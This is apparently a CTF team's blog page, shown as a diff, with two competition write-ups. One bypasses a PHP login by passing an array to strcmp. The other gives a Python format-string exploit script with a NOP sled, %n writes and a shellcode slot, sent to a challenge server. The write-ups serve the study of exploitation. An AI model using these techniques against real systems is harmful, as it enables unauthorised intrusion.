+<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/03/login-2.png" alt="login page" /></p>
+
+<p>We can get the source code of Web site.</p>
+
+<p>View the source code: login&#95;ok.php login.php opt&#95;util.php</p>
+
+<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/03/login.png" alt="login.php source" /></p>
+
+<p>ID is local IP-address, PS is password which we need to input.</p>
+
+<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/03/otp_util.png" alt="opt_util.php source" /></p>
+
+<p>otp_utill contains a function.</p>
+
+<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/03/login_ok.png" alt="login_ok.php" /></p>
+
+<p>Login audit process is through the &#8220;strcmp&#8221; judgment is consistent, and then judge whether the IP is 127.0.0.1. then get the flag.</p>
+
+<p>In login_ok.php</p>
+
+<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/03/strcmp.png" alt="strcmp" /></p>
+
+<p>reference：<a href="http://hakipedia.com/index.php/Full_Path_Disclosure#Array.5B.5D_Parameter_Injection">Array[] Parameter Injection</a> <a href="http://php.net/manual/en/function.strcmp.php">PHP function strcmp</a></p>
+
+<p>strcmp(str, array) == 0</p>
+
+<p>I modified the parameters(ID=127.0.0.1 ps[]=adrian),and then submit。</p>
+
+<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/03/script.png" alt="exploit" /></p>
+
+<p>bingo！！！Get the flag！！！</p>
+
+<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/03/flag.png" alt="flag" /></p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/29c3-ctf-exploitation-400-proxy/">29C3 CTF Exploitation 400 Proxy</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-01-01T00:00:00+08:00" pubdate data-updated="true">Jan 1<span>st</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Hellok and I worked on this challenge for a quite long time. We failed to solve this challenge though, we exploit the format string vulnerability successfully.</p>
+
+<p>We spent a lot of time looking for methods to bypass PAM authentication and neglect the quite obvious format string vulnerability.</p>
+
+<p>Let&#8217;s first look at the stack layout:</p>
+
+<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/01/proxy_stack.jpg" alt="proxy_stack" /></p>
+
+<p>We can see the pointer &#8220;format&#8221; will be overwritten in the lowest 3 bytes.</p>
+
+<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/01/proxy_exploit2.jpg" alt="proxy_exploit2" /></p>
+
+<p>Format string vulnerability is here.</p>
+
+<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/01/proxy_exploit.jpg" alt="proxy_exploit" /></p>
+
+<p>To exploit such format string, we first get some stack address exposed using &#8220;%x&#8221; format of printf. Code for exploitation is as follows:</p>
+
+<pre><code>import socket  
+import time  
+import base64  
+import random  
+import struct
+
+shellcode = # We tried several 71 bytes shellcode and succeeded in our local environment 
+
+IP = "94.45.252.240"
+PORT = 1024
+
+buf = 'GET '
+buf += '/'
+buf += ' HTTP/1.1'
+buf += 'Authorization: Basic '
+authkey=base64.b64encode('n:1')
+buf += authkey
+buf += "a\x78\xf7\xff\xbf\x79\xf7\xff\xbf\x7a\xf7\xff\xbf\x7b\xf7\xff\xbf"
+buf += "\x90"*250
+buf += shellcode
+buf += "\x90"*50
+buf += "%117x%165$n%253x%166$n%10x%167$n%192x%168$n"
+buf += "." * (508-len(buf))
+buf += "\x94\xf5"
+print "*****************"
+print "buf len = ", len(authkey)
+print "buf len = ", len(buf)
+
+s = socket.socket()
+s.connect((IP, PORT))
+s.send(buf)
+print s.recv(10000)
+</code></pre>
+
+<p>We didn&#8217;t understand SECCOMP_FILTER well so we failed to execute shellcode in remote server. According to other writeups, we know that the key is hided in the cache which can be easily captured using &#8220;%s&#8221; format of printf.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="/blog/page/6/">&larr; Older</a>
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+    <a class="next" href="/blog/page/4/">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
+      </li>
+    
+      <li class="post">
+        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
+      </li>
+    
+      <li class="post">
+        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - blue-lotus -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
